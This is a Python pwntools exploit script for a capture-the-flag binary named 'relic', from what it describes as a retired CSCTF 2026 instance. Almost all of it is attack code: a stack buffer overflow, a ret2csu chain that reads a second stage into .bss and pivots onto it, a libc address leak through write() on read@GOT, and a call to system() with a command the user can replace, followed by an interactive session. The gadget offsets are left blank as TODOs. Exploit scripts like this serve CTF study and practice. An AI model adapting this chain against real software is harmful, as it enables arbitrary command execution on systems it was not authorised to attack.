#!/usr/bin/env python3
"""relic - Pwn (Medium): 0x120-byte read into a 0x40 buffer, 72 bytes to saved RIP.
One-shot; uses ret2csu (via __libc_csu_init) to read a stage-2 payload into .bss,
pivots onto it, leaks libc's read via write() on read@GOT, then calls system().

Usage: python3 relic.py <host> <port>       (remote)
       python3 relic.py local [./relic]     (local binary)

The CSCTF 2026 instance is retired; this PoC documents the exploit path.
"""
import sys
from pwn import *

context.arch = "amd64"

OFFSET = 72          # bytes of padding to saved RIP
READ_GOT = 0x403fe8
WRITE_GOT = 0x403fd8
BSS = 0x404800

# libc offsets (bundled libc)
LIBC_READ_OFF = 0x10e1e0
LIBC_SYSTEM_OFF = 0x52290

# TODO: supply gadget offsets from the binary (not reproduced in the writeup)
CSU_POP = None     # pop rbx, rbp, r12, r13, r14, r15 ; ret          (binary offset)
CSU_CALL = None    # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8] (binary offset)
LEAVE_RET = None   # leave ; ret                                      (binary offset)
POP_RDI = None     # pop rdi ; ret                                    (binary/libc offset)
RET_ALIGN = None   # single ret for 16-byte stack alignment           (binary/libc offset)

BSS2 = BSS + 0x100          # where the system() stage is read into
CMD = b"cat /flag\x00"      # command passed to system(); override via argv[3] if desired


def ret2csu(call_got, rdi, rsi, rdx, rbp_after):
    chain = p64(CSU_POP)
    chain += p64(0)                       # rbx
    chain += p64(1)                       # rbp (loop runs exactly once)
    chain += p64(call_got)                # r12 -> [r12] is called
    chain += p64(rdi & 0xffffffff)        # r13 -> edi
    chain += p64(rsi)                     # r14 -> rsi
    chain += p64(rdx)                     # r15 -> rdx
    chain += p64(CSU_CALL)
    chain += p64(0)                       # add rsp, 8 padding
    chain += p64(0)                       # pop rbx
    chain += p64(rbp_after)               # pop rbp (used by trailing leave; ret)
    chain += p64(0) * 4                   # pop r12-r15
    return chain


def main():
    missing = [n for n, v in (("CSU_POP", CSU_POP), ("CSU_CALL", CSU_CALL),
                              ("LEAVE_RET", LEAVE_RET), ("POP_RDI", POP_RDI),
                              ("RET_ALIGN", RET_ALIGN)) if v is None]
    if missing:
        raise SystemExit("TODO: set gadget offsets: " + ", ".join(missing))

    if len(sys.argv) >= 2 and sys.argv[1] == "local":
        binary = sys.argv[2] if len(sys.argv) > 2 else "./relic"
        p = process(binary)
    elif len(sys.argv) >= 2:
        host, _, port = sys.argv[1].partition(":")
        p = remote(host, int(port))
    else:
        raise SystemExit(__doc__)

    # --- Stage 1: overflow -> ret2csu read(0, BSS, 0x200) -> leave;ret pivot to BSS
    cmd = sys.argv[3].encode() + b"\x00" if len(sys.argv) > 3 else CMD
    stage1 = b"A" * OFFSET
    stage1 += ret2csu(READ_GOT, 0, BSS, 0x200, rbp_after=BSS)
    stage1 += p64(LEAVE_RET)
    p.send(stage1)

    # --- Stage 2 (at BSS): ret2csu write(1, read@GOT, 8) to leak libc, then
    # ret2csu read(0, BSS2, 0x100) for stage 3 -> leave;ret pivot to BSS2
    stage2 = p64(0xdeadbeef)              # popped into rbp by the stage-1 pivot
    stage2 += ret2csu(WRITE_GOT, 1, READ_GOT, 8, rbp_after=BSS2)
    stage2 += ret2csu(READ_GOT, 0, BSS2, 0x100, rbp_after=BSS2)
    stage2 += p64(LEAVE_RET)
    p.send(stage2)

    leak = u64(p.recvn(8))
    libc_base = leak - LIBC_READ_OFF
    system = libc_base + LIBC_SYSTEM_OFF
    log.info("read@libc  = %s", hex(leak))
    log.info("libc base  = %s", hex(libc_base))
    log.info("system     = %s", hex(system))

    # --- Stage 3 (at BSS2): pop rdi ; ret -> system("<cmd>")
    stage3 = p64(0xdeadbeef)              # popped into rbp by the stage-2 pivot
    stage3 += p64(RET_ALIGN)
    binsh_addr = BSS2 + 0x28              # location of the command string below
    stage3 += p64(POP_RDI)
    stage3 += p64(binsh_addr)
    stage3 += p64(system)
    stage3 += cmd.ljust(0x20, b"\x00")    # lands at binsh_addr = BSS2 + 0x28
    p.send(stage3)

    p.interactive()


if __name__ == "__main__":
    main()
